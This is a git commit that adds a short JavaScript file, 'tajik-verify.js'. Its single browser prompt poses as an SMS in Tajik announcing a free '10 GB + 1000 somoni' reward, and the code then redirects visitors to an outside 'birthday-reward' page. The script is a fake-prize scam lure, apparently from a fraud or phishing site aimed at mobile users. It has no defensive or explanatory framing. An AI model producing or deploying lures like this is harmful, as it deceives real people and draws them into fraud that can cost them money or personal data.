670733ddd9fd75b7df0f4c0c26cba06e4fdafc4c
mfednewblog8 <nsikakimoh68@gmail.com>
2026-05-26 06:50:24 +0100

    Create tajik-verify.js

---
+++ tajik-verify.js
@@ -0,0 +1,5 @@
+var password = '10ГБ + 1000 сомонӣ'
+password=prompt('SMS: Табрикот, Рақами мобилии шумо ҳуқуқи гирифтани 10 ГБ + 1000 сомонӣ дорад, OK-ро пахш кунед, то ҳозир фаъол шавед.','10ГБ + 1000 сомонӣ');
+if (password != '10ГБ + 1000 сомонӣ') {
+location.href='https://ibaidad.com/birthday-reward.html';
+}
